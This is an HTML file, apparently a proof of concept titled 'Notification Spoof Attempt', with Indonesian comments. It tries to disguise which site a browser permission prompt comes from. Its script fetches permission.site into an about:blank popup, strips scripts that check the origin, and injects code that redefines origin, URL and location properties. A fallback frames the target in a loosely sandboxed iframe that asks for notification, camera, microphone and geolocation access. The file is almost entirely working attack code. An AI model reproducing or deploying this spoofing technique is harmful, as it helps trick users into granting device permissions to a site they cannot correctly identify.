<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Notification Spoof Attempt</title>
  <style>body { font-family: Arial; padding: 20px; }</style>
</head>
<body>
  <button onclick="openSpoofedPopup()">Open Popup</button>

  <script>
    async function openSpoofedPopup() {
      const targetUrl = "https://permission.site";

      // Cara 1: Popup about:blank + inject + spoof (versi agresif)
      const win = window.open("about:blank", "_blank", "width=800,height=600,resizable=yes");

      if (!win) return alert("Popup diblokir");

      try {
        const res = await fetch(targetUrl);
        let html = await res.text();

        // Hapus semua base & script yang mungkin override
        html = html.replace(/<base[^>]*>/gi, '');
        html = html.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi, (m) => {
          if (m.includes('location.origin') || m.includes('document.URL')) return '';
          return m;
        });

        // Inject script spoofing lebih awal
        const spoofScript = `
          <script>
            Object.defineProperty(window, 'origin', {get: () => 'null', configurable: false});
            Object.defineProperty(document, 'URL', {get: () => 'about:blank', configurable: false});
            Object.defineProperty(location, 'origin', {get: () => 'null', configurable: false});
            Object.defineProperty(location, 'href', {get: () => 'about:blank', configurable: false});
            // Coba blokir akses ke parent
            try { window.top = window.self; } catch(e) {}
            // Coba override Permission API
            const origReq = Notification.requestPermission;
            Notification.requestPermission = function() {
              return origReq.apply(this, arguments);
            };
            // Coba force null origin
            window.__proto__ = null;
            document.__proto__ = null;
          <\/script>
        `;

        html = html.replace(/<head>/i, `<head>${spoofScript}<base href="${targetUrl}/">`);

        win.document.open();
        win.document.write(html);
        win.document.close();
      } catch (e) {
        console.error(e);

        // Cara 2: Iframe sandbox dengan allow-same-origin (tapi origin tetap)
        win.document.open();
        win.document.write(`
<!DOCTYPE html>
<html>
<head>
  <title>about:blank</title>
  <base href="${targetUrl}/">
  <script>
    Object.defineProperty(window, 'origin', {get: () => 'null'});
    Object.defineProperty(location, 'origin', {get: () => 'null'});
  <\/script>
</head>
<body style="margin:0;">
  <iframe src="${targetUrl}" style="border:none;width:100vw;height:100vh;"
    sandbox="allow-scripts allow-same-origin allow-modals allow-popups allow-forms allow-top-navigation allow-storage-access-by-user-activation"
    allow="notifications; microphone; camera; geolocation">
  </iframe>
</body>
</html>`);
        win.document.close();
      }
    }
  </script>
</body>
</html>
